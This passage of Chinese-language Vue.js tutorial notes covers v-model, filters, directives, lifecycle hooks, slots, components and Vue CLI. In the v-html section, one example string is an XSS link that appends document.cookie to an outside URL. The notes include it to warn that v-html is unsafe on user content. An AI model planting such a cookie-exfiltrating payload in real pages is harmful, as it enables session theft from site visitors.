> 			(2)v-model的初始值是数组，那么收集的的就是value组成的数组
> 		备注：v-model的三个修饰符：
> 					**lazy**：失去焦点再收集数据
> 					**number**：输入字符串转为有效的数字
> 					**trim**：输入首尾空格过滤

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>收集表单数据</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<form @submit.prevent="demo">
				账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
				密码：<input type="password" v-model="userInfo.password"> <br/><br/>
				年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
				性别：
				男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
				女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
				爱好：
				学习<input type="checkbox" v-model="userInfo.hobby" value="study">
				打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
				吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
				<br/><br/>
				所属校区
				<select v-model="userInfo.city">
					<option value="">请选择校区</option>
					<option value="beijing">北京</option>
					<option value="shanghai">上海</option>
					<option value="shenzhen">深圳</option>
					<option value="wuhan">武汉</option>
				</select>
				<br/><br/>
				其他信息：
				<textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
				<input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
				<button>提交</button>
			</form>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		new Vue({
			el:'#root',
			data:{
				userInfo:{
					account:'',
					password:'',
					age:18,
					sex:'female',
					hobby:[],
					city:'beijing',
					other:'',
					agree:''
				}
			},
			methods: {
				demo(){
					console.log(JSON.stringify(this.userInfo))
				}
			}
		})
	</script>
</html>
```

## 过滤器

> 过滤器：
> 	定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
> 	语法：
> 				1.注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
> 				2.使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"
> 	备注：
> 				1.过滤器也可以接收额外参数、多个过滤器也可以串联
> 				2.并没有改变原本的数据, 是产生新的对应的数据

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>过滤器</title>
		<script type="text/javascript" src="../js/vue.js"></script>
		<script type="text/javascript" src="../js/dayjs.min.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>显示格式化后的时间</h2>
			<!-- 计算属性实现 -->
			<h3>现在是：{{fmtTime}}</h3>
			<!-- methods实现 -->
			<h3>现在是：{{getFmtTime()}}</h3>
			<!-- 过滤器实现 -->
			<h3>现在是：{{time | timeFormater}}</h3>
			<!-- 过滤器实现（传参） -->
			<h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
			<h3 :x="msg | mySlice">尚硅谷</h3>
		</div>

		<div id="root2">
			<h2>{{msg | mySlice}}</h2>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		//全局过滤器
		Vue.filter('mySlice',function(value){
			return value.slice(0,4)
		})
		
		new Vue({
			el:'#root',
			data:{
				time:1621561377603, //时间戳
				msg:'你好，尚硅谷'
			},
			computed: {
				fmtTime(){
					return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
				}
			},
			methods: {
				getFmtTime(){
					return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
				}
			},
			//局部过滤器
			filters:{
				timeFormater(value,str='YYYY年MM月DD日 HH:mm:ss'){
					// console.log('@',value)
					return dayjs(value).format(str)
				}
			}
		})

		new Vue({
			el:'#root2',
			data:{
				msg:'hello,atguigu!'
			}
		})
	</script>
</html>
```

## 内置指令

> 我们学过的指令：
> 						v-bind	: 单向绑定解析表达式, 可简写为 :xxx
> 						v-model	: 双向数据绑定
> 						v-for  	: 遍历数组/对象/字符串
> 						v-on   	: 绑定事件监听, 可简写为@
> 						v-if 	 	: 条件渲染（动态控制节点是否存存在）
> 						v-else 	: 条件渲染（动态控制节点是否存存在）
> 						v-show 	: 条件渲染 (动态控制节点是否展示)
>
> 内置指令：
> v-text
>  v-html
>  v-clock
>  v-once
> v-pre

### v-text

> 1.作用：向其所在的节点中渲染文本内容。
> 2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-text指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<div>你好，{{name}}</div>
			<div v-text="name"></div>
			<div v-text="str"></div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				str:'<h3>你好啊！</h3>'
			}
		})
	</script>
</html>
```

### v-html

#### cookies

​	Cookie，有时也用其复数形式 Cookies。类型为“**小型文本文件**”，是某些网站为了辨别用户身份，进行[Session](https://baike.baidu.com/item/Session/479100)跟踪而储存在用户本地终端上的数据（通常经过加密），由用户[客户端](https://baike.baidu.com/item/客户端/101081)计算机暂时或永久保存的信息

格式：`“a=1,b=2 ”`

调取方法：`document.cookie`

附加属性**HttpOnly**：HttpOnly是包含在http返回头Set-Cookie里面的一个附加的flag，所以它是后端服务器对cookie设置的一个附加的属性，在生成cookie时使用HttpOnly标志有助于减轻客户端脚本访问受保护cookie的风险（如果浏览器支持的话）

浏览器查看：

![image-20220713115316688](https://raw.githubusercontent.com/Thea-wyj/pic/main/img/image-20220713115316688.png)

工作流程：

![image-20220713115420419](https://raw.githubusercontent.com/Thea-wyj/pic/main/img/image-20220713115420419.png)

不允许跨浏览器使用

![image-20220713115446335](https://raw.githubusercontent.com/Thea-wyj/pic/main/img/image-20220713115446335.png)

> 1.作用：向指定节点中渲染包含html结构的内容。
> 2.与插值语法的区别：
> 	(1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
> 	(2).v-html可以识别html结构。
> 3.严重注意：v-html有安全性问题！！！！
> 	(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
> 	(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
>
> **XSS攻击**：XSS攻击通常指的是通过利用[网页](https://baike.baidu.com/item/网页/99347)开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括[Java](https://baike.baidu.com/item/Java/85979)、 [VBScript](https://baike.baidu.com/item/VBScript/473081)、[ActiveX](https://baike.baidu.com/item/ActiveX/529325)、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-html指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<div>你好，{{name}}</div>
			<div v-html="str"></div>
			<div v-html="str2"></div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				str:'<h3>你好啊！</h3>',
				str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
			}
		})
	</script>
</html>
```

### v-clock

> 1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
> 2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-cloak指令</title>
		<style>
			[v-cloak]{
				display:none;
			}
		</style>
		<!-- 引入Vue -->
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-cloak>{{name}}</h2>
		</div>
		<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
	</body>
	
	<script type="text/javascript">
		console.log(1)
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			}
		})
	</script>
</html>
```

### v-once

> 1.v-once所在节点在初次动态渲染后，就视为静态内容了。
> 2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-once指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-once>初始化的n值是:{{n}}</h2>
			<h2>当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				n:1
			}
		})
	</script>
</html>
```

### v-pre

> 1.跳过其所在节点的编译过程。
> 2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-pre指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-pre>Vue其实很简单</h2>
			<h2 >当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				n:1
			}
		})
	</script>
</html>
```

## 自定义指令

> 需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
> 需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
> 自定义指令总结：
> 	一、定义语法：
> 	(1).局部指令：
> 		new Vue({											new Vue({
> 			directives:{指令名:配置对象}   或   		directives{指令名:回调函数}
> 		}) 															})
> 	(2).全局指令：
> 			Vue.directive(指令名,配置对象) 或   Vue.directive(指令名,回调函数)
>
> ​	二、配置对象中常用的3个回调：
> ​		(1).bind：指令与元素成功绑定时调用。
> ​		(2).inserted：指令所在元素被插入页面时调用。
> ​		(3).update：指令所在模板结构被重新解析时调用。
>
> ​	三、备注：
> ​		1.指令定义时不加v-，但使用时要加v-；
> ​		2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>自定义指令</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>{{name}}</h2>
			<h2>当前的n值是：<span v-text="n"></span> </h2>
			<!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2> -->
			<h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
			<button @click="n++">点我n+1</button>
			<hr/>
			<input type="text" v-fbind:value="n">
		</div>
	</body>
	
	<script type="text/javascript">
		Vue.config.productionTip = false

		//定义全局指令
		/* Vue.directive('fbind',{
			//指令与元素成功绑定时（一上来）
			bind(element,binding){
				element.value = binding.value
			},
			//指令所在元素被插入页面时
			inserted(element,binding){
				element.focus()
			},
			//指令所在的模板被重新解析时
			update(element,binding){
				element.value = binding.value
			}
		}) */

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				n:1
			},
			directives:{
				//big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
				/* 'big-number'(element,binding){
					// console.log('big')
					element.innerText = binding.value * 10
				}, */
				big(element,binding){
					console.log('big',this) //注意此处的this是window
					// console.log('big')
					element.innerText = binding.value * 10
				},
				fbind:{
					//指令与元素成功绑定时（一上来）
					bind(element,binding){
						element.value = binding.value
					},
					//指令所在元素被插入页面时
					inserted(element,binding){
						element.focus()
					},
					//指令所在的模板被重新解析时
					update(element,binding){
						element.value = binding.value
					}
				}
			}
		})
		
	</script>
</html>
```

## 生命周期

> 1.又名：生命周期回调函数、生命周期函数、生命周期钩子。
>
> 2.是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。
>
> 3.生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
>
> 4.生命周期函数中的this指向是vm 或 组件实例对象。
>
> 常用的生命周期钩子：
>
> ​            1.mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
>
> ​            2.beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。
>
> 关于销毁Vue实例
>
> ​            1.销毁后借助Vue开发者工具看不到任何信息。
>
> ​            2.销毁后自定义事件会失效，但原生DOM事件依然有效。
>
> ​            3.一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。

![lifeCircle](https://raw.githubusercontent.com/Thea-wyj/pic/main/img/lifeCircle.png)


```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>分析生命周期</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root" :x="n">
			<h2 v-text="n"></h2>
			<h2>当前的n值是：{{n}}</h2>
			<button @click="add">点我n+1</button>
			<button @click="bye">点我销毁vm</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			// template:`
			// 	<div>
			// 		<h2>当前的n值是：{{n}}</h2>
			// 		<button @click="add">点我n+1</button>
			// 	</div>
			// `,
			data:{
				n:1
			},
			methods: {
				add(){
					console.log('add')
					this.n++
				},
				bye(){
					console.log('bye')
					this.$destroy()
				}
			},
			watch:{
				n(){
					console.log('n变了')
				}
			},
			beforeCreate() {
				console.log('beforeCreate')
			},
			created() {
				console.log('created')
			},
			beforeMount() {
				console.log('beforeMount')
			},
			mounted() {
				console.log('mounted')
			},
			beforeUpdate() {
				console.log('beforeUpdate')
			},
			updated() {
				console.log('updated')
			},
			beforeDestroy() {
				console.log('beforeDestroy')
			},
			destroyed() {
				console.log('destroyed')
			},
		})
	</script>
</html>
```

## slot

Vue 实现了一套内容分发的 API，将`<slot>`元素作为承载分发内容的出口。具体来说，slot就是可以让你在组件内添加内容的‘空间’。

```vue
//父组件：（引用子组件 ebutton）

<template>
  <div class= 'app'>
     <ebutton> {{ parent }}</ebutton>
  </div>
</template>

new Vue({
  el:'.app',
  data:{
    parent:'父组件'
  }
})
//子组件 ： (假设名为：ebutton)
<template>
  <div class= 'button'>
      <button></button>
      <slot></slot>       //slot 可以放在任意位置。（这个位置就是父组件添加内容的显示位置）
  </div> 
</template>
```

子组件可以在任意位置添加slot , 这个位置就是父组件添加内容的显示位置。

**编译作用域**

直接传入子组件内的数据是不可以的。因为：父级模板里的所有内容都是在父级作用域中编译的；子模板里的所有内容都是在子作用域中编译的。

**后备内容 **

子组件<slot> </slot>设置默认值

```vue
//子组件 ： (假设名为：ebutton)
<template>
  <div class= 'button'>
      <button>  </button>
      <slot> 这就是默认值 </slot>
  </div>
</template>
```

**具名插槽**

子组件 多个<slot ></slot> <slot></slot> 对应插入内容

```vue
//子组件 ： (假设名为：ebutton)
<template>
  <div class= 'button'>
      <button>  </button>
      <slot name= 'one'> 这就是默认值1</slot>
      <slot name='two'> 这就是默认值2 </slot>
      <slot name='three'> 这就是默认值3 </slot>
  </div>
</template>
```

```vue
//父组件：（引用子组件 ebutton）
<template>
  <div class= 'app'>
     <ebutton> 
        <template v-slot:one> 这是插入到one插槽的内容 </template>
        <template v-slot:two> 这是插入到two插槽的内容 </template>
        <template v-slot:three> 这是插入到three插槽的内容 </template>
     </ebutton>
  </div>
</template>
```

书写 **v-slot:one** 的形式时，可以简写为 **#one**

**作用域插槽**

父组件 在子组件 <slot> </slot> 处使用子组件 data

- 首先在子组件的slot上动态绑定一个值( :key='value')
- 然后在父组件通过v-slot : name = ‘values ’的方式将这个值赋值给 values
- 最后通过{{ values.key }}的方式获取数据

```vue
//子组件 ： (假设名为：ebutton)
<template>
  <div class= 'button'>
      <button>  </button>
      <slot name= 'one' :value1='child1'> 这就是默认值1</slot>    //绑定child1的数据
      <slot :value2='child2'> 这就是默认值2 </slot>  //绑定child2的数据，这里我没有命名slot
  </div>           
</template>

new Vue({
  el:'.button',
  data:{
    child1:'数据1',
    child2:'数据2'
  }
})

//父组件：（引用子组件 ebutton）
<template>
  <div class= 'app'>
     <ebutton> 

        // 通过v-slot的语法 将插槽 one 的值赋值给slotonevalue 
        <template v-slot:one = 'slotonevalue'>  
           {{ slotonevalue.value1 }}
        </template>

        // 同上，由于子组件没有给slot命名，默认值就为default
        <template v-slot:default = 'slottwovalue'> 
           {{ slottwovalue.value2 }}
        </template>

     </ebutton>
  </div>
</template>
```

# Vue组件化编程

传统方式编写应用存在的**问题**：

1. 依赖关系混乱，不好维护 （js模块化可解决一部分依赖问题）
2. 代码复用率不高

组件的**定义**：实现应用中局部功能代码和资源的集合 

> js模块化
>
> 模块化主要是用于管理代码，解决解耦与复用问题
>
> 现代模块化需要解决的问题：
>
> - 命名冲突，全局污染
> - 模块内部逻辑的封装性隔离
> - 模块之间的通讯（依赖引用、循环引用、引用顺序）
>
> 通过闭包特性，我们在JavaScript发展历史中演化出了多种模块化方式：
>
> - IIFE
> - AMD
> - CMD
> - CJS
> - ESM
>
> 无论哪种方法，他们都会有一个依赖对象的关系存在：
>
> ![image-20230228095245959](https://gitee.com/dorothea817/pics/raw/master/image-20230228095245959.png)
>
> ![image-20230228095321278](https://gitee.com/dorothea817/pics/raw/master/image-20230228095321278.png)
>
> ![image-20230228095931606](https://gitee.com/dorothea817/pics/raw/master/image-20230228095931606.png)
>
> ![image-20230228095946532](https://gitee.com/dorothea817/pics/raw/master/image-20230228095946532.png)
>
> ![image-20230228095956833](https://gitee.com/dorothea817/pics/raw/master/image-20230228095956833.png)
>
> ![image-20230228100239744](https://gitee.com/dorothea817/pics/raw/master/image-20230228100239744.png)
>
> **EMS**
>
> esm 通过import export两个关键字分别定义导入与导出
>
> ```js
> // main.js
> import { count } from "./counter.js"
> import { render } from './display.js'
> 
> function fn () {
>   count()
>   render()
> }
> 
> export {
>   fn
> }
> ```
>
> **ESM大致流程**
>
> 1. **构建**：先建立一张构建关系图。需要指定一个入口entry，通过检测其中的import语句收集其相关依赖
> 2. **解析**：通过构建阶段可以获取构建关系图 得到依赖对应的文件（浏览器不能直接使用），ESM会对这些文件进行解析，最终将这些文件解析为 Module Record（模块记录），然后通过 Module Record（模块记录）才能获取文件内部的具体信息
> 3. **实例化**：为上一阶段获得的模块开辟内存存储，并把模块指向对应的内存地址。这个过程也叫做：**Linking（链接）**
> 4. **运行代码**：最后当我们运行代码时，对应存储的内存空间会填充为真实值
>
>
> 以上步骤可以互相独立运行，称为EMS的**异步加载**
>
> **ESM实际流程**
>
> 1.  构建 & 解析：模块定位（**模块定位符（Module Specifier）**）、提取文件（`<script type="module"></script>`）、解析文件
> 2. 实例化：与`CJS`不同，`ESM`实例化过程是采用导入与导出同时指向一份内存地址，这种方式被称之为**实时绑定（Live Binding）**。除了这点，`ESM`导出的值也不能被外部变更，因为它是只读的。
> 3. 运行：运行时有一个原则：**模块只执行一次**。这是为了防止多次执行导致的模块导出不一致问题（比如：模块内部请求了一个接口）。由于模块映射（Module Map）是通过url对应模块的内存地址的，所以可以保证每个模块只有一个内存指向，就可以保证只执行一次。模块运行也是进行深度优先的后序遍历。

- 非单文件组件：一个文件中包含有n个组件
- ==单文件组件：一个文件中只有一个组件== 

## 非单文件组件

> Vue中使用组件的三大步骤：
>     一、定义组件(创建组件)
>     二、注册组件
>     三、使用组件(写组件标签)
>
>    一、如何定义一个组件？
>    使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；
>    区别如下：
>    1.**el不要写**，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
>    2.**data必须写成函数**，为什么？ ———— 避免组件被复用时，数据存在引用关系。
>    备注：使用template可以配置组件结构。
>
>    二、如何注册组件？
>    1.局部注册：靠new Vue的时候传入components选项
>    2.全局注册：靠Vue.component('组件名',组件)
>
>    三、编写组件标签：
>                <school></school>

### 创建组件

```js
//第一步：创建school组件
const school = Vue.extend({
   template:`
      <div class="demo">
         <h2>学校名称：{{schoolName}}</h2>
         <h2>学校地址：{{address}}</h2>
         <button @click="showName">点我提示学校名</button> 
      </div>
   `,
   // el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。
   data(){
      return {
         schoolName:'尚硅谷',
         address:'北京昌平'
      }
   },
   methods: {
      showName(){
         alert(this.schoolName)
      }
   },
})
```

### 注册组件

```js
//创建vm
new Vue({
    el:'#root',
    data:{
        msg:'你好啊！'
    },
    //第二步：注册组件（局部注册）
    components:{
        school,
        student
    }
})

//第二步：全局注册组件
Vue.component('hello',hello)
```

### 使用组件

```html
<school></school>
```

### 组件命名规范

关于**组件名**:

-   一个单词组成：

  - 第一种写法(首字母小写)：school
  - 第二种写法(首字母大写)：School

- 多个单词组成：

  - 第一种写法(kebab-case命名)：my-school
  - 第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)

- 备注：

  - 组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。

  - 可以使用**name配置项**指定组件在开发者工具中呈现的名字。

    ```js
    //定义组件
    const s = Vue.extend({
        name:'atguigu',
        template:`
    				<div>
    					<h2>学校名称：{{name}}</h2>	
    					<h2>学校地址：{{address}}</h2>	
    				</div>
    			`,
        data(){
            return {
                name:'尚硅谷',
                address:'北京'
            }
        }
    })
    ```

关于**组件标签:**

1. 第一种写法：`<school></school>`
2. 第二种写法：`<school/>`  （不用使用脚手架时，`<school/>`会导致后续组件不能渲染）

创建组件**简写**方式： ` const school = Vue.extend(options)` 可简写为：`const school = options`

```js
const s = {
    name:'atguigu',
    template:`
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
				</div>
			`,
    data(){
        return {
            name:'尚硅谷',
            address:'北京'
        }
    }
}
new Vue({
    el:'#root',
    data:{
        msg:'欢迎学习Vue!'
    },
    components:{
        school:s  //源码中会判断components接受的是对象还是Vue.extend，如果是对象则自动执行Vue.extend
    }
})
```

### 组件的嵌套

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>组件的嵌套</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		//定义student组件
		const student = Vue.extend({
			name:'student',
			template:`
				<div>
					<h2>学生姓名：{{name}}</h2>	
					<h2>学生年龄：{{age}}</h2>	
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					age:18
				}
			}
		})
		
		//定义school组件
		const school = Vue.extend({
			name:'school',
			template:`
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
					<student></student>
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					address:'北京'
				}
			},
			//注册组件（局部）
			components:{
				student
			}
		})

		//定义hello组件
		const hello = Vue.extend({
			template:`<h1>{{msg}}</h1>`,
			data(){
				return {
					msg:'欢迎来到尚硅谷学习！'
				}
			}
		})
		
		//定义app组件
		const app = Vue.extend({
			template:`
				<div>	
					<hello></hello>
					<school></school>
				</div>
			`,
			components:{
				school,
				hello
			}
		})

		//创建vm
		new Vue({
			template:'<app></app>',
			el:'#root',
			//注册组件（局部）
			components:{app}
		})
	</script>
</html>
```

### VueComponent

1. school组件本质是一个名为**VueComponent**的构造函数，且不是程序员定义的，是**Vue.extend生成**的。
2. 我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的**实例对象**，即Vue帮我们执行的：`new VueComponent(options)`。
3. 特别注意：每次调用Vue.extend，返回的都是一个**全新的VueComponen**t！！！！
4. 关于this指向：
   - 组件配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是**VueComponent实例对象**。
   - new Vue(options)配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是**Vue实例对象**。
5. VueComponent的实例对象，以后简称**vc**（也可称之为：组件实例对象）。Vue的实例对象，以后简称**vm**。
6. vc是可复用的vm，但二者并不完全相同，vm有容器，而vc只能依托于vm

### vm和vc的内置关系

> **JavaScript prototype（原型对象）**
>
> 所有的 JavaScript 对象都会从一个 prototype（原型对象）中继承属性和方法。
>
> - `Date` 对象从 `Date.prototype` 继承。
> - `Array` 对象从 `Array.prototype` 继承。
> - `Person` 对象从 `Person.prototype` 继承。
>
> 所有 JavaScript 中的对象都是位于原型链顶端的 Object 的实例。
>
> JavaScript 对象有一个指向一个原型对象的链。当试图访问一个对象的属性时，它不仅仅在该对象上搜寻，还会搜寻该对象的原型，以及该对象的原型的原型，依次层层向上搜索，直到找到一个名字匹配的属性或到达原型链的末尾。
>
> `Date` 对象, `Array` 对象, 以及 `Person` 对象从 `Object.prototype` 继承。
>
> **添加属性和方法**
>
> 有的时候我们想要在所有已经存在的对象添加新的属性或方法。另外，有时候我们想要在对象的构造函数中添加属性或方法。使用 prototype 属性就可以给对象的构造函数添加新的属性和方法：
>
> ```js
> function Person(first, last, age, eyecolor) {
>   this.firstName = first;
>   this.lastName = last;
>   this.age = age;
>   this.eyeColor = eyecolor;
> }
>  
> Person.prototype.nationality = "English";
> Person.prototype.name = function() {
>   return this.firstName + " " + this.lastName;
> };
> ```
>
> **显示原型属性和隐式原型属性**
>
> 二者指向相同的原型对象，只是使用方法不一样
>
> ```js
> //定义一个构造函数
> function Demo(){
>     this.a = 1
>     this.b = 2
> }
> //创建一个Demo的实例对象
> const d = new Demo()
> 
> console.log(Demo.prototype) //显示原型属性
> 
> console.log(d.__proto__) //隐式原型属性
> 
> console.log(Demo.prototype === d.__proto__)
> 
> //程序员通过显示原型属性操作原型对象，追加一个x属性，值为99
> Demo.prototype.x = 99
> 
> console.log('@',d)
> ```

1. 一个重要的内置关系：`VueComponent.prototype.__proto__ === Vue.prototype`
2. 为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。

![image-20230228141742360](https://gitee.com/dorothea817/pics/raw/master/image-20230228141742360.png)

## 单文件组件

最基础的需要三个文件：

![image-20230306094802011](https://gitee.com/dorothea817/pics/raw/master/image-20230306094802011.png)

或者使用vue脚手架：Vue CLI（Command-Line Interface）

#### Vue CLI

**介绍：**

Vue CLI 是一个基于 Vue.js 进行快速开发的完整系统，提供：

- 通过 `@vue/cli` 实现的交**互式的项目脚手架**。
- 通过 `@vue/cli` + `@vue/cli-service-global` 实现的**零配置原型开发**。
- 一个运行时依赖 (`@vue/cli-service`)，该依赖：
  - 可升级；
  - 基于 webpack 构建，并带有合理的默认配置；
  - 可以通过项目内的配置文件进行配置；
  - 可以通过插件进行扩展。
- 一个丰富的官方插件集合，集成了前端生态中最好的工具。
- 一套完全**图形化**的创建和管理 Vue.js 项目的用户界面。

**包括：**

- CLI：提供终端里的vue命令，vue serve和vue ui
- CLI-service：提供开发环境依赖，包含了加载其它 CLI 插件的核心服务、一个针对绝大部分应用优化过的内部的 webpack 配置、项目内部的 `vue-cli-service` 命令，提供 `serve`、`build` 和 `inspect` 命令
- CLI-plugin：向 Vue 项目提供可选功能的 npm 包，Vue CLI 插件的名字以 `@vue/cli-plugin-` (内建插件) 或 `vue-cli-plugin-` (社区插件) 开头，当你在项目内部运行 `vue-cli-service` 命令时，它会自动解析并加载 `package.json` 中列出的所有 CLI 插件。

**安装**：

```cmd
npm install -g @vue/cli
# OR
yarn global add @vue/cli
```

**升级：**

```cmd
npm update -g @vue/cli

# 或者
yarn global upgrade --latest @vue/cli
```

**升级依赖：**

```cmd
vue upgrade [options] [plugin-name]
```

**安装依赖：**

```cmd
vue add eslint
#这个命令将 @vue/eslint 解析为完整的包名 @vue/cli-plugin-eslint，然后从 npm 安装它，调用它的生成器。上下二者等价
vue add cli-plugin-eslint

```

**创建项目：**

```cmd
vue create my-project
# OR
vue ui
```

**vue ui：**

![图形化界面预览](https://cli.vuejs.org/ui-new-project.png)

![image-20230306103536391](https://gitee.com/dorothea817/pics/raw/master/image-20230306103536391.png)

**项目结构：**

```
├── node_modules 
├── public
│   ├── favicon.ico: 页签图标
│   └── index.html: 主页面
├── src
│   ├── assets: 存放静态资源
│   │   └── logo.png
│   │── component: 存放组件
│   │   └── HelloWorld.vue
│   │── App.vue: 汇总所有组件
│   │── main.js: 入口文件
├── .gitignore: git版本管制忽略的配置
├── babel.config.js: babel的配置文件
├── package.json: 应用包配置文件 
├── README.md: 应用描述文件
├── package-lock.json：包版本控制文件
```

![image-20230306104209871](https://gitee.com/dorothea817/pics/raw/master/image-20230306104209871.png)

- Index 文件：`public/index.html` 文件是一个会被 [html-webpack-plugin](https://github.com/jantimon/html-webpack-plugin) 处理的模板。在构建过程中，资源链接会被自动注入。另外，Vue CLI 也会自动注入 resource hint (`preload/prefetch`、manifest 和图标链接 (当用到 PWA 插件时) 以及构建过程中处理的 JavaScript 和 CSS 文件的资源链接。

- 插值：因为 index 文件被用作模板，所以你可以使用 [lodash template](https://lodash.com/docs/4.17.10#template) 语法插入内容：

  - `<%= VALUE %>` 用来做不转义插值；
  - `<%- VALUE %>` 用来做 HTML 转义插值；
